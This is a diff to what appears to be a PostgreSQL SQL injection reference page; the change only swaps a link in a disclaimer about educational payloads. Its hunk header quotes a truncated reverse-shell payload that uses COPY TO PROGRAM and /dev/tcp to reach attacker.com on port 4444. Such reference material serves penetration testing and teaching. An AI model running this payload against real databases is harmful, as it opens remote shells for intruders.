@@ -140,7 +140,7 @@ COPY (SELECT '') TO PROGRAM 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5 | while
 
 ### Injection Examples (Simplified/Educational)
 
-**⚠️ Disclaimer:** The following payloads are simplified educational examples that assume ideal conditions: no WAF, exact quote/comment context matching the injection point, stacked queries enabled, and no prepared statements. Real-world exploitation requires understanding the specific injection context (string vs numeric, single vs double quotes, comment syntax). See [Operations & Syntax](/postgresql/operations-syntax) for context-aware payload construction.
+**⚠️ Disclaimer:** The following payloads are simplified educational examples that assume ideal conditions: no WAF, exact quote/comment context matching the injection point, stacked queries enabled, and no prepared statements. Real-world exploitation requires understanding the specific injection context (string vs numeric, single vs double quotes, comment syntax). See [Testing for Injection](/postgresql/testing-injection) for identifying the injection context.
 
 ```sql
 -- Basic command execution (assumes string context with single quotes, stacked queries)
